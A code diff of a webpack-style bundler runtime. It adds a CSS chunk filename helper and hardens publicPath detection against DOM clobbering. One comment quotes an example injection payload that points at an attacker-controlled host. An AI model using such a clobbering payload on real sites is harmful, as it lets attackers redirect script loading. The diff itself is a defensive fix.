@@ -94,6 +94,17 @@ __webpack_require__.e = function (chunkId) {
         };
       
 })();
+// webpack/runtime/get mini-css chunk filename
+(() => {
+// This function allow to reference chunks
+        __webpack_require__.miniCssF = function (chunkId) {
+          // return url for filenames not based on template
+          
+          // return url for filenames based on template
+          return "" + chunkId + ".css";
+        };
+      
+})();
 // webpack/runtime/global
 (() => {
 __webpack_require__.g = (function () {
@@ -234,14 +245,17 @@ __webpack_require__.O = function (result, chunkIds, fn, priority) {
     if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
     var document = __webpack_require__.g.document;
     if (!scriptUrl && document) {
-      if (document.currentScript) scriptUrl = document.currentScript.src;
-        if (!scriptUrl) {
-          var scripts = document.getElementsByTagName("script");
-              if (scripts.length) {
-                var i = scripts.length - 1;
-                while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
-              }
-        }
+      // Technically we could use `document.currentScript instanceof window.HTMLScriptElement`,
+      // but an attacker could try to inject `<script>HTMLScriptElement = HTMLImageElement</script>`
+      // and use `<img name="currentScript" src="https://attacker.controlled.server/"></img>`
+      if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') scriptUrl = document.currentScript.src;
+      if (!scriptUrl) {
+        var scripts = document.getElementsByTagName("script");
+            if (scripts.length) {
+              var i = scripts.length - 1;
+              while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
+            }
+      }
       }
     
     // When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration",
